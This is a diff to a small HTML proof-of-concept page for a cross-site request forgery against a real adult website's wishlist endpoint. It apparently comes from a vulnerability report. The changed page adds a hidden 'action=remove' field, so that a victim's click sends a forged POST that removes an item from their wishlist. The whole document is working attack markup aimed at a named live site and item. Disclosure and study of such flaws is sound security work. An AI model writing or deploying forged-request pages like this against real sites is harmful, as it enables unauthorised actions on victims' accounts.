@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Click the button to trigger the CSRF request silently.</h3>
+    <h3>Click the button to send a forged remove-from-wishlist request.</h3>
 
-    <form action="https://www.mydirtyhobby.com/wishlist/manage/item/11970671" method="POST">
-      <button type="submit">Modify Wishlist</button>
+    <form action="https://www.mydirtyhobby.com/wishlist/manage/item/11970671"
+          method="POST">
+      <input type="hidden" name="action" value="remove">
+      <button type="submit">Remove from Wishlist</button>
     </form>
 
-    <p><i>Victim wishlist modified (add or remove) on click.</i></p>
+    <p><i>This forces the server to remove the item from the victim's wishlist if vulnerable.</i></p>
   </body>
 </html>
